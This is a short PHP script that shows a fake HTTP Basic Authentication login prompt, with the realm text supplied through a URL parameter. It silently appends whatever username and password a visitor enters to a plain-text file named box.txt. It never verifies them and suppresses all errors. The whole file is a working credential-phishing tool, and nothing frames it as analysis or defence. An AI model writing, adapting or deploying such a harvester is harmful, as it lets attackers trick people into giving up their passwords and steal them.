<?php
error_reporting(0);
if ((!isset($_SERVER['PHP_AUTH_USER']))||(!isset($_SERVER['PHP_AUTH_PW']))){
header('WWW-Authenticate:Basic realm="'.addslashes(trim($_GET['info']))."");
header('HTTP/1.0 401 Unauthorized');
echo 'Authorization Required.';
exit;
}
else if ((isset($_SERVER['PHP_AUTH_USER']))&&(isset($_SERVER['PHP_AUTH_PW'])))
{
$log=fopen("box.txt","a");
Fwrite($log,$_SERVER['PHP_AUTH_USER']."\r\n");
Fwrite($log,$_SERVER['PHP_AUTH_PW']."\r\n");
Fclose($log);
}
?>